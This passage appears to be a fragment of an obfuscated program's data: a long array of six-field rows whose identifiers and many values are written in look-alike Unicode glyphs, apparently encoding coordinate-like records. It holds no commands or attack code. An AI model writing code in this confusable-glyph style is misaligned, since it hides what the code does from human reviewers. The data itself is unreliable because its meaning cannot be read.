			[Ⲇᐃⵠ, ⵠ[348], 35, Δᐃⵠⵠⵠ, 155, ᐃΔΔ],
			[1, ⵠ[348], 33, 13, 155, 0],
			[ⵠΔΔ, ⵠ[348], 33, 33, 158, ⵠⲆⲆ],
			[ΔΔΔ, ⵠ[348], 36, 78, 155, 0],
			[ⵠΔᐃ, ⵠ[348], 36, 87, 157, Δⵠᐃ],
			[ΔΔΔ, ⵠ[273], 1, 73, 36, ᐃⵠⲆ],
			[ΔⲆⵠ, ⵠ[273], 1, 80, 24, 0],
			[1, ⵠ[273], ⵠⵠⵠΔ, 67, 36, 0],
			[ⵠΔⲆ, ⵠ[273], 2, 45, 36, ⲆΔⵠ],
			[1, ⵠ[273], 2, 53, 34, 0],
			[ᐃⲆᐃ, ⵠ[273], 1, 51, 35, 0],
			[1, ⵠ[273], 1, 58, 35, 0],
			[ΔⲆⵠ, ⵠ[273], 1, 33, 35, 0],
			[ΔΔΔ, ⵠ[273], ΔΔΔ, 31, 33, 0],
			[1, ⵠ[273], 2, 29, 36, 0],
			[ⵠΔᐃ, ⵠ[273], 2, 56, 36, 0],
			[1, ⵠ[273], 2, 60, 37, 0],
			[ⵠΔΔ, ⵠ[273], 2, 45, 32, 0],
			[ΔⲆⵠ, ⵠ[273], 2, 22, 25, 0],
			[ⵠΔⲆ, ⵠ[273], ⵠⵠΔⲆ, 21, 35, 0],
			[1, ⵠ[348], 52, 90, 208, 0],
			[1, ⵠ[348], ⲆⵠⵠⲆⲆ, 94, 250, ⲆΔⵠ],
			[1, ⵠ[348], ⵠᐃΔΔΔⲆⲆ, 95, 253, 0],
			[ᐃⲆᐃ, ⵠ[568], Δⵠᐃ, 140, 5, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 139, 5, 1],
			[1, ⵠ[568], 2, 138, ΔⵠⲆⲆ, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 138, ΔᐃⲆᐃ, ⵠΔΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 139, 6, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 141, 6, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 140, ⵠΔᐃΔⲆ, ᐃⲆᐃ],
			[ᐃᐃⵠ, ⵠ[156], 3, 143, 7, ΔΔΔ],
			[ΔΔΔ, ⵠ[156], ⵠⵠⵠᐃ, 139, 7, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 137, 7, 1],
			[ⵠΔᐃ, ⵠ[568], 1, 138, 8, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⲆ, 137, ᐃⲆⲆⲆ, ⵠΔⲆ],
			[ΔⲆⵠ, ⵠ[568], 2, 137, ⵠⵠⲆⵠΔ, 1],
			[1, ⵠ[568], 2, 136, 7, 1],
			[1, ⵠ[568], 2, 138, ⲆΔⲆΔⵠ, ⵠΔⲆ],
			[1, ⵠ[568], 3, 139, 9, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆᐃᐃ, 136, Δᐃⵠⵠⵠ, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], 3, 137, ᐃⵠᐃᐃⲆ, 1],
			[1, ⵠ[348], 53, 92, 165, ⵠⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 53, 92, 180, 0],
			[ⵠΔⲆ, ⵠ[348], 53, 92, 188, 0],
			[1, ⵠ[348], 54, 92, 153, 0],
			[ⵠⲆΔ, ⵠ[348], 54, 91, 153, ᐃΔΔ],
			[1, ⵠ[348], 54, 90, 153, ᐃⵠⲆ],
			[1, ⵠ[348], 54, 89, 153, ΔⲆⲆ],
			[1, ⵠ[348], 54, 88, 153, ⲆΔⵠ],
			[1, ⵠ[348], 54, 87, 153, 0],
			[1, ⵠ[348], 54, 86, 153, 0],
			[1, ⵠ[348], 54, 85, 153, Δⵠᐃ],
			[1, ⵠ[348], 54, 84, 153, 0],
			[Ⲇᐃⵠ, ⵠ[348], 54, 83, 153, 0],
			[1, ⵠ[348], 54, 82, 153, 0],
			[1, ⵠ[348], 54, 81, 153, ΔⲆⲆ],
			[1, ⵠ[348], 54, 80, 153, ΔⲆⲆ],
			[ΔΔΔ, ⵠ[348], 54, 79, 153, 0],
			[1, ⵠ[348], 54, 78, 153, 0],
			[1, ⵠ[348], 54, 77, 153, 0],
			[ⵠΔᐃ, ⵠ[348], 54, 76, 153, ⵠⲆⲆ],
			[1, ⵠ[348], 54, 75, 153, ᐃΔΔ],
			[1, ⵠ[348], 54, 74, 153, ⵠⲆⲆ],
			[1, ⵠ[348], 54, 73, 153, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[348], 54, 72, 153, 0],
			[1, ⵠ[348], 54, 70, 153, 0],
			[1, ⵠ[348], 54, 71, 153, 0],
			[ᐃᐃⵠ, ⵠ[348], 54, 69, 153, ⵠⲆⲆ],
			[1, ⵠ[348], 54, 68, 153, ΔⲆⲆ],
			[1, ⵠ[348], 54, 67, 153, ᐃⵠⲆ],
			[ⵠΔᐃ, ⵠ[348], 54, 66, 153, ᐃⵠΔ],
			[1, ⵠ[348], 54, 65, 153, 0],
			[1, ⵠ[348], 54, 64, 153, ᐃⵠΔ],
			[Ⲇᐃⵠ, ⵠ[348], 54, 63, 153, ᐃⵠΔ],
			[1, ⵠ[348], 54, 61, 153, 0],
			[ⵠΔⲆ, ⵠ[348], 54, 62, 153, 0],
			[Ⲇᐃⵠ, ⵠ[348], 54, 60, 153, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 54, 59, 153, 0],
			[1, ⵠ[348], 54, 57, 153, ᐃⵠΔ],
			[Ⲇᐃⵠ, ⵠ[348], 54, 58, 153, ⵠⲆⲆ],
			[1, ⵠ[348], 54, 56, 153, Δⵠᐃ],
			[1, ⵠ[348], 54, 55, 153, 0],
			[ⵠΔⲆ, ⵠ[348], 54, 54, 153, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 54, 53, 153, ᐃⵠΔ],
			[1, ⵠ[348], 54, 52, 153, 0],
			[ⵠⲆΔ, ⵠ[348], 54, 51, 153, ᐃΔΔ],
			[ⵠΔⲆ, ⵠ[348], 54, 50, 153, 0],
			[1, ⵠ[348], 54, 49, 153, ΔΔⵠ],
			[1, ⵠ[348], 54, 48, 153, ΔⲆⲆ],
			[1, ⵠ[348], 54, 47, 153, ᐃΔΔ],
			[1, ⵠ[348], 54, 46, 153, ⲆΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], 54, 45, 153, ᐃⵠⲆ],
			[1, ⵠ[348], 54, 44, 153, 0],
			[1, ⵠ[348], 54, 43, 153, 0],
			[1, ⵠ[348], 54, 42, 153, ⲆΔⵠ],
			[ⵠⲆΔ, ⵠ[348], 54, 41, 153, 0],
			[ᐃᐃⵠ, ⵠ[348], 54, 40, 153, 0],
			[1, ⵠ[348], 54, 39, 153, ᐃΔΔ],
			[1, ⵠ[348], 54, 37, 153, 0],
			[1, ⵠ[348], 54, 38, 153, 0],
			[1, ⵠ[348], 54, 36, 153, 0],
			[ⵠΔⲆ, ⵠ[348], 54, 35, 153, 0],
			[ⵠΔᐃ, ⵠ[348], 54, 34, 153, ᐃⵠΔ],
			[1, ⵠ[348], 54, 33, 153, 0],
			[1, ⵠ[348], 54, 32, 153, 0],
			[ⵠΔΔ, ⵠ[348], 54, 31, 153, 0],
			[ΔΔΔ, ⵠ[348], 54, 30, 153, 0],
			[ΔΔΔ, ⵠ[348], 54, 29, 153, ᐃΔΔ],
			[1, ⵠ[348], 54, 28, 153, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 54, 27, 153, 0],
			[1, ⵠ[348], 54, 26, 153, ΔΔⵠ],
			[1, ⵠ[348], 54, 25, 153, 0],
			[1, ⵠ[348], 54, 24, 153, 0],
			[1, ⵠ[348], 54, 23, 153, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], 54, 22, 153, ᐃⵠΔ],
			[1, ⵠ[348], 54, 21, 153, 0],
			[ᐃⲆᐃ, ⵠ[348], 54, ⵠᐃΔᐃᐃ, 153, 0],
			[ΔⲆⵠ, ⵠ[348], 54, 19, 153, ᐃⵠΔ],
			[ⵠⲆΔ, ⵠ[348], 54, 18, 153, 0],
			[1, ⵠ[348], 54, 17, 153, ᐃⵠⲆ],
			[ΔⲆⵠ, ⵠ[348], 54, 16, 153, 0],
			[ⵠΔⲆ, ⵠ[348], 54, 15, 153, ⲆΔⵠ],
			[1, ⵠ[348], 54, ⵠⲆΔᐃᐃ, 153, ᐃⵠⲆ],
			[ΔΔΔ, ⵠ[348], 54, ⲆⲆΔⵠᐃ, 153, ᐃΔΔ],
			[1, ⵠ[348], 54, 12, 153, 0],
			[ΔΔΔ, ⵠ[348], 54, Ⲇᐃᐃᐃᐃ, 153, 0],
			[1, ⵠ[348], 54, 10, 153, 0],
			[1, ⵠ[348], 54, ΔᐃΔⲆⲆ, 153, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[348], 54, 9, 153, ΔΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 55, 83, ⵠⵠⲆⵠΔ, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 83, 9, 0],
			[ΔⲆⵠ, ⵠ[348], 55, 83, 10, 0],
			[ⵠΔᐃ, ⵠ[348], 55, 83, 11, 0],
			[1, ⵠ[348], 55, 83, ⲆΔⲆⲆᐃ, ᐃⵠⲆ],
			[1, ⵠ[348], 55, 83, 13, ⵠⲆⲆ],
			[1, ⵠ[348], 55, 83, ⵠⲆΔᐃᐃ, ΔΔⵠ],
			[ΔΔΔ, ⵠ[348], 55, 83, 15, 0],
			[1, ⵠ[348], 55, 83, ΔⵠΔᐃᐃ, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 83, 17, ᐃΔΔ],
			[ᐃᐃⵠ, ⵠ[348], 55, 83, 19, ᐃⵠΔ],
			[ΔⲆⵠ, ⵠ[348], 55, 83, 18, 0],
			[ᐃᐃⵠ, ⵠ[348], 55, 83, ⵠᐃΔᐃᐃ, 0],
			[1, ⵠ[348], 55, 83, 21, 0],
			[ΔⲆⵠ, ⵠ[348], 55, 83, 22, ΔⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], 55, 83, 23, ΔΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], 55, 83, 24, 0],
			[ⵠΔΔ, ⵠ[348], 55, 83, 25, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 83, 26, ᐃⵠΔ],
			[ⵠΔᐃ, ⵠ[348], 55, 83, 27, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 55, 83, 28, ᐃΔΔ],
			[1, ⵠ[348], 55, 83, 29, 0],
			[1, ⵠ[348], 55, 83, 30, ⲆΔⵠ],
			[1, ⵠ[348], 55, 83, 31, 0],
			[ⵠΔΔ, ⵠ[348], 55, 83, 32, 0],
			[ᐃᐃⵠ, ⵠ[348], 55, 83, 33, 0],
			[1, ⵠ[348], 55, 83, 34, 0],
			[1, ⵠ[348], 55, 83, 36, 0],
			[ᐃⲆᐃ, ⵠ[348], 55, 83, 35, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 55, 83, 37, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 83, 38, ᐃⵠΔ],
			[1, ⵠ[348], 55, 81, 38, ᐃΔΔ],
			[ᐃⲆᐃ, ⵠ[348], 55, 82, 38, Δⵠᐃ],
			[ΔⲆⵠ, ⵠ[348], 55, 80, 38, 0],
			[ΔΔΔ, ⵠ[348], 55, 79, 38, 0],
			[1, ⵠ[348], 55, 78, 38, 0],
			[ⵠⲆΔ, ⵠ[348], 55, 77, 38, 0],
			[ΔⲆⵠ, ⵠ[348], 55, 76, 38, 0],
			[1, ⵠ[348], 55, 75, 38, ᐃΔΔ],
			[1, ⵠ[348], 55, 73, 38, 0],
			[1, ⵠ[348], 55, 74, 38, 0],
			[ΔΔΔ, ⵠ[348], 55, 72, 38, ᐃⵠⲆ],
			[1, ⵠ[348], 55, 71, 38, ᐃΔΔ],
			[1, ⵠ[348], 55, 70, 38, Δⵠᐃ],
			[1, ⵠ[348], 55, 68, 38, ᐃⵠⲆ],
			[ⵠΔᐃ, ⵠ[348], 55, 69, 38, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[348], 55, 67, 38, 0],
			[1, ⵠ[348], 55, 66, 38, 0],
			[1, ⵠ[348], 55, 65, 38, 0],
			[ⵠΔⲆ, ⵠ[348], 55, 64, 38, ᐃⵠΔ],
			[1, ⵠ[348], 55, 63, 38, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 62, 38, ΔΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], 55, 60, 38, ᐃⵠΔ],
			[1, ⵠ[348], 55, 61, 38, ⵠⲆⲆ],
			[1, ⵠ[348], 55, 59, 38, 0],
			[ᐃⲆᐃ, ⵠ[348], 55, 57, 38, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 55, 58, 38, ΔⲆⲆ],
			[1, ⵠ[348], 55, 56, 38, 0],
			[1, ⵠ[348], 55, 55, 38, 0],
			[ⵠΔᐃ, ⵠ[348], 55, 54, 38, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 55, 53, 38, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[348], 55, 52, 38, Δⵠᐃ],
			[ΔΔΔ, ⵠ[348], 55, 51, 38, 0],
			[1, ⵠ[348], 55, 49, 38, ⵠⲆⲆ],
			[1, ⵠ[348], 55, 50, 38, 0],
			[1, ⵠ[348], 55, 48, 38, 0],
			[1, ⵠ[348], 55, 47, 38, 0],
			[1, ⵠ[348], 55, 46, 38, 0],
			[ⵠΔᐃ, ⵠ[348], 55, 45, 38, 0],
			[1, ⵠ[348], 55, 44, 38, 0],
			[1, ⵠ[348], 55, 43, 38, 0],
			[1, ⵠ[348], 55, 42, 38, ΔⲆⲆ],
			[1, ⵠ[348], 55, 41, 38, ᐃⵠⲆ],
			[1, ⵠ[348], 55, 40, 38, 0],
			[1, ⵠ[348], 55, 39, 38, 0],
			[1, ⵠ[348], 55, 38, 38, 0],
			[1, ⵠ[348], 55, 37, 38, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 36, 38, 0],
			[1, ⵠ[348], 55, 34, 38, ⵠⲆⲆ],
			[1, ⵠ[348], 55, 35, 38, ⵠⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 55, 33, 38, 0],
			[ⵠΔⲆ, ⵠ[348], 55, 31, 38, 0],
			[ᐃⲆᐃ, ⵠ[348], 55, 32, 38, 0],
			[ⵠⲆΔ, ⵠ[348], 55, 30, 38, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 29, 38, Δⵠᐃ],
			[ⵠΔΔ, ⵠ[348], 55, 28, 38, ᐃⵠΔ],
			[1, ⵠ[348], 55, 27, 38, ⲆΔⵠ],
			[1, ⵠ[348], 55, 26, 38, 0],
			[1, ⵠ[348], 55, 25, 38, 0],
			[1, ⵠ[348], 55, 24, 38, 0],
			[1, ⵠ[348], 55, 23, 38, ⵠⲆⲆ],
			[1, ⵠ[348], 55, 21, 38, 0],
			[ᐃⲆᐃ, ⵠ[348], 55, 22, 38, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[348], 55, ⵠΔΔⲆⲆ, 38, ⲆΔⵠ],
			[1, ⵠ[348], 55, 19, 38, ⵠⲆⲆ],
			[1, ⵠ[348], 55, 19, 37, 0],
			[ᐃᐃⵠ, ⵠ[348], 55, 19, 36, 0],
			[1, ⵠ[348], 55, 19, 35, 0],
			[1, ⵠ[348], 55, 19, 34, ⵠⲆⲆ],
			[1, ⵠ[348], 55, ΔΔΔΔⲆ, 33, 0],
			[ⵠⲆΔ, ⵠ[348], 55, 19, 32, ᐃΔΔ],
			[1, ⵠ[348], 55, 19, 31, ᐃⵠⲆ],
			[1, ⵠ[348], 55, ᐃΔⲆΔⵠ, 30, 0],
			[1, ⵠ[348], 55, ᐃΔⲆΔⵠ, 28, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 55, 19, 29, ᐃⵠΔ],
			[1, ⵠ[348], 55, 19, 27, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, ᐃΔΔⲆΔ, 26, ᐃΔΔ],
			[ⵠΔⲆ, ⵠ[348], 55, ᐃΔⲆΔⵠ, 25, 0],
			[ΔⲆⵠ, ⵠ[348], 55, ΔΔⲆᐃⵠ, 24, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 55, ΔⲆⲆⲆⵠ, 23, ⵠⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 55, ᐃΔΔⲆΔ, 22, ΔⲆⲆ],
			[1, ⵠ[348], 55, 19, 21, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 19, 20, ΔⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 55, 19, 18, ⲆΔⵠ],
			[ⵠⲆΔ, ⵠ[348], 55, ΔⲆⲆⲆⵠ, ΔΔΔΔⲆ, 0],
			[ⵠΔⲆ, ⵠ[348], 55, ⵠⲆᐃΔᐃ, 16, ⵠⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 55, ᐃΔΔⲆΔ, ⲆΔⲆᐃΔΔⲆ, ⵠⲆⲆ],
			[1, ⵠ[348], 55, ΔΔⲆᐃⵠ, ΔⲆⵠΔⲆⲆⵠ, ΔΔⵠ],
			[ⵠΔᐃ, ⵠ[348], 55, 19, ⵠⵠⵠᐃᐃ, 0],
			[ᐃⲆᐃ, ⵠ[348], 55, 19, ΔⲆⵠΔⵠ, 0],
			[ᐃⲆᐃ, ⵠ[348], 55, ⵠⲆᐃΔᐃ, ⵠⲆⵠⲆⵠ, ᐃⵠⲆ],
			[ΔΔΔ, ⵠ[348], 55, 19, 11, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 55, ⲆⲆⲆⵠᐃ, 10, 0],
			[1, ⵠ[348], 55, 19, ⵠᐃΔⵠΔ, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], 55, 19, ⲆᐃΔⲆⵠ, ⵠⲆⲆ],
			[1, ⵠ[348], 55, 84, 35, 0],
			[ᐃᐃⵠ, ⵠ[348], 55, 84, 32, 0],
			[1, ⵠ[348], 55, 84, 25, 0],
			[1, ⵠ[348], 50, 84, 24, 0],
			[1, ⵠ[348], 55, 84, 20, ᐃⵠΔ],
			[ᐃᐃⵠ, ⵠ[348], 55, 84, ⵠⵠᐃΔΔ, ⲆΔⵠ],
			[1, ⵠ[348], 55, 84, 16, 0],
			[ⵠΔⲆ, ⵠ[348], 50, 84, ΔⵠΔᐃⵠ, 0],
			[1, ⵠ[348], 55, 84, 8, ᐃΔΔ],
			[1, ⵠ[348], 55, 84, 9, 0],
			[1, ⵠ[348], 50, 85, 11, Δⵠᐃ],
			[1, ⵠ[348], 55, 81, 39, 0],
			[Ⲇᐃⵠ, ⵠ[348], 50, 83, 40, 0],
			[1, ⵠ[348], 55, 72, 39, ⲆΔⵠ],
			[1, ⵠ[348], 55, 74, 39, 0],
			[ΔⲆⵠ, ⵠ[348], 55, 66, 39, 0],
			[ΔⲆⵠ, ⵠ[348], 55, 65, 39, Δⵠᐃ],
			[1, ⵠ[348], 50, 67, 41, ᐃΔΔ],
			[ⵠΔⲆ, ⵠ[348], 55, 56, 39, 0],
			[Ⲇᐃⵠ, ⵠ[348], 55, 58, 39, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], 55, 50, 39, 0],
			[1, ⵠ[348], 50, 49, 39, ᐃⵠⲆ],
			[1, ⵠ[348], 55, 44, 39, ᐃⵠⲆ],
			[1, ⵠ[348], 55, 42, 39, ΔΔⵠ],
			[1, ⵠ[348], 50, 43, 39, ᐃΔΔ],
			[1, ⵠ[348], 50, 41, 39, ᐃⵠΔ],
			[1, ⵠ[348], 50, 37, 39, ΔΔⵠ],
			[ΔΔΔ, ⵠ[348], 55, 36, 39, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 55, 32, 39, ᐃⵠΔ],
			[ΔⲆⵠ, ⵠ[348], 50, 31, 39, 0],
			[ᐃᐃⵠ, ⵠ[348], 55, 23, 39, 0],
			[1, ⵠ[348], 55, ᐃᐃᐃᐃⲆ, 37, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[348], 50, ⲆⵠⲆᐃΔ, 36, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 55, 18, 35, 0],
			[Ⲇᐃⵠ, ⵠ[348], 50, 18, 34, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[348], 55, ᐃΔᐃΔᐃ, 31, ᐃⵠΔ],
			[ᐃᐃⵠ, ⵠ[348], 50, ⲆᐃΔⵠΔ, 30, 0],
			[1, ⵠ[348], 55, 18, 25, 0],
			[ⵠΔᐃ, ⵠ[348], 50, 18, 24, 0],
			[ⵠΔᐃ, ⵠ[348], 55, 18, ΔΔⲆⵠᐃ, ⲆΔⵠ],
			[1, ⵠ[348], 55, 18, 14, 0],
			[1, ⵠ[348], 50, ᐃΔΔⵠᐃ, 15, Δⵠᐃ],
			[ⵠΔⲆ, ⵠ[348], 55, ⲆⵠⵠⲆⲆ, 8, 0],
			[1, ⵠ[348], 54, 90, 154, ⵠⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 51, 89, 154, ⵠⲆⲆ],
			[1, ⵠ[348], 54, 85, 154, 0],
			[1, ⵠ[348], 54, 81, 154, ᐃⵠⲆ],
			[ΔⲆⵠ, ⵠ[348], 54, 76, 154, ⵠⲆⲆ],
			[1, ⵠ[348], 54, 70, 154, ᐃⵠΔ],
			[ΔΔΔ, ⵠ[348], 54, 66, 154, 0],
			[ᐃᐃⵠ, ⵠ[348], 54, 61, 154, 0],
			[Ⲇᐃⵠ, ⵠ[348], 54, 56, 154, ᐃΔΔ],
			[1, ⵠ[348], 54, 53, 154, Δⵠᐃ],
			[ΔΔΔ, ⵠ[348], 54, 45, 154, 0],
			[1, ⵠ[348], 54, 42, 154, 0],
			[1, ⵠ[348], 54, 37, 154, 0],
			[ᐃⲆᐃ, ⵠ[348], 54, 30, 154, 0],
			[ⵠΔᐃ, ⵠ[348], 54, 25, 154, 0],
			[1, ⵠ[348], 54, 17, 154, 0],
			[1, ⵠ[348], 54, 10, 154, 0],
			[ΔΔΔ, ⵠ[348], 54, Δᐃⵠⵠⵠ, 154, ΔΔⵠ],
			[ⵠΔⲆ, ⵠ[348], 55, ⵠΔΔⲆⲆ, 9, ᐃⵠⲆ],
			[ΔⲆⵠ, ⵠ[348], 53, 93, 154, ᐃΔΔ],
			[1, ⵠ[348], 53, 93, 156, 0],
			[ⵠⲆΔ, ⵠ[348], 53, 93, 158, ⵠⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 52, 91, 157, 0],
			[ⵠΔΔ, ⵠ[348], 53, 93, 159, ᐃⵠⲆ],
			[1, ⵠ[348], 53, 93, 161, 0],
			[ΔⲆⵠ, ⵠ[348], 53, 93, 162, ⵠⲆⲆ],
			[1, ⵠ[348], 53, 93, 163, 0],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 164, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 53, 93, 165, 0],
			[1, ⵠ[348], 53, 93, 166, ᐃⵠΔ],
			[ⵠΔⲆ, ⵠ[348], 53, 93, 167, 0],
			[ⵠΔᐃ, ⵠ[348], 52, 91, 167, ᐃⵠΔ],
			[1, ⵠ[348], 53, 93, 169, 0],
			[ΔⲆⵠ, ⵠ[348], 53, 93, 168, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 170, 0],
			[ΔⲆⵠ, ⵠ[348], 53, 93, 171, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 53, 93, 173, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[348], 53, 93, 176, 0],
			[1, ⵠ[348], 53, 93, 175, 0],
			[1, ⵠ[348], 53, 92, 169, 0],
			[1, ⵠ[348], 53, 93, 178, 0],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 179, ᐃⵠⲆ],
			[1, ⵠ[348], 53, 93, 180, ⲆΔⵠ],
			[1, ⵠ[348], 53, 93, 181, 0],
			[1, ⵠ[348], 53, 93, 183, ᐃⵠⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 53, 93, 184, ᐃⵠⲆ],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 186, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[348], 18, 95, 185, 0],
			[1, ⵠ[348], 53, 93, 187, 0],
			[ⵠΔⲆ, ⵠ[348], 53, 93, 188, ᐃⵠΔ],
			[ⵠΔᐃ, ⵠ[348], 52, 91, 186, 0],
			[1, ⵠ[348], 53, 93, 190, Δⵠᐃ],
			[1, ⵠ[348], 53, 93, 192, 0],
			[ⵠⲆΔ, ⵠ[348], 53, 93, 195, 0],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 194, ΔΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 52, 91, 196, 0],
			[ⵠⲆΔ, ⵠ[348], 53, 93, 197, 0],
			[1, ⵠ[348], 53, 93, 200, ΔⲆⲆ],
			[1, ⵠ[348], 53, 93, 198, 0],
			[1, ⵠ[348], 53, 93, 201, Δⵠᐃ],
			[ⵠΔⲆ, ⵠ[348], 53, 93, 202, 0],
			[1, ⵠ[348], 53, 93, 203, ᐃⵠΔ],
			[ⵠΔΔ, ⵠ[348], 53, 93, 204, 0],
			[1, ⵠ[348], 53, 93, 206, 0],
			[1, ⵠ[348], 53, 93, 205, ᐃⵠⲆ],
			[1, ⵠ[348], 53, 93, 207, ᐃⵠΔ],
			[1, ⵠ[348], 53, 93, 209, ΔⲆⲆ],
			[1, ⵠ[348], 53, 93, 210, 0],
			[ᐃⲆᐃ, ⵠ[348], 53, 93, 212, 0],
			[1, ⵠ[348], 52, 91, 204, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 53, 93, 213, ᐃⵠⲆ],
			[ΔΔΔ, ⵠ[348], 53, 93, 214, ⲆΔⵠ],
			[1, ⵠ[348], 53, 93, 215, 0],
			[1, ⵠ[348], 53, 93, 216, 0],
			[1, ⵠ[348], 53, 93, 217, ᐃⵠⲆ],
			[ⵠⲆΔ, ⵠ[348], 53, 93, 218, 0],
			[ⵠΔᐃ, ⵠ[348], 53, 93, 219, 0],
			[ⵠΔᐃ, ⵠ[348], 53, 93, 220, 0],
			[1, ⵠ[348], 52, 92, 213, 0],
			[1, ⵠ[348], 52, 92, 206, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 52, 92, 202, ᐃⵠΔ],
			[1, ⵠ[348], 53, 92, 201, ΔⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], 52, 92, 194, Δⵠᐃ],
			[ⵠΔᐃ, ⵠ[348], 52, 92, 178, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[348], 52, 92, 171, ᐃⵠΔ],
			[1, ⵠ[348], 53, 93, 221, 0],
			[1, ⵠ[348], 53, 93, 222, ΔΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 53, 93, 223, ⲆΔⵠ],
			[1, ⵠ[348], 53, 93, 225, 0],
			[ᐃⲆᐃ, ⵠ[348], 53, 93, 228, ᐃⵠⲆ],
			[1, ⵠ[348], 53, 93, 227, ⲆΔⵠ],
			[1, ⵠ[348], 52, 92, 217, 0],
			[1, ⵠ[348], 53, 92, 218, ᐃⵠΔ],
			[ΔΔΔ, ⵠ[348], 52, 92, 221, 0],
			[1, ⵠ[348], 52, 92, 225, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[348], 52, 93, 226, 0],
			[ᐃᐃⵠ, ⵠ[348], 52, 93, 224, 0],
			[ⵠⲆΔ, ⵠ[348], 52, 93, 208, ᐃⵠⲆ],
			[1, ⵠ[348], 52, 93, 211, ᐃⵠΔ],
			[Ⲇᐃⵠ, ⵠ[348], 52, 93, 196, ΔΔⵠ],
			[ⵠΔⲆ, ⵠ[348], 52, 93, 199, ᐃΔΔ],
			[1, ⵠ[348], 52, 93, 189, ᐃⵠΔ],
			[ⵠΔΔ, ⵠ[348], 52, 93, 191, ΔⲆⲆ],
			[1, ⵠ[348], 52, 93, 193, 0],
			[ⵠΔⲆ, ⵠ[348], 52, 93, 182, ⲆΔⵠ],
			[1, ⵠ[348], 52, 93, 185, 0],
			[ᐃᐃⵠ, ⵠ[348], 52, 93, 172, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 52, 93, 174, 0],
			[1, ⵠ[348], 52, 93, 177, ΔΔⵠ],
			[1, ⵠ[348], 52, 93, 155, 0],
			[ⵠΔΔ, ⵠ[348], 52, 93, 157, ⵠⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 52, 93, 160, ⵠⲆⲆ],
			[1, ⵠ[348], 52, 92, 162, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 53, 93, 229, ᐃⵠⲆ],
			[1, ⵠ[348], 53, 93, 231, 0],
			[1, ⵠ[348], 53, 93, 232, Δⵠᐃ],
			[1, ⵠ[348], 53, 93, 234, 0],
			[1, ⵠ[348], 52, 93, 230, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[348], 52, 92, 228, 0],
			[1, ⵠ[348], 53, 93, 235, 0],
			[1, ⵠ[348], 53, 93, 236, 0],
			[ⵠΔⲆ, ⵠ[348], 53, 93, 237, 0],
			[1, ⵠ[348], 53, 93, 239, Δⵠᐃ],
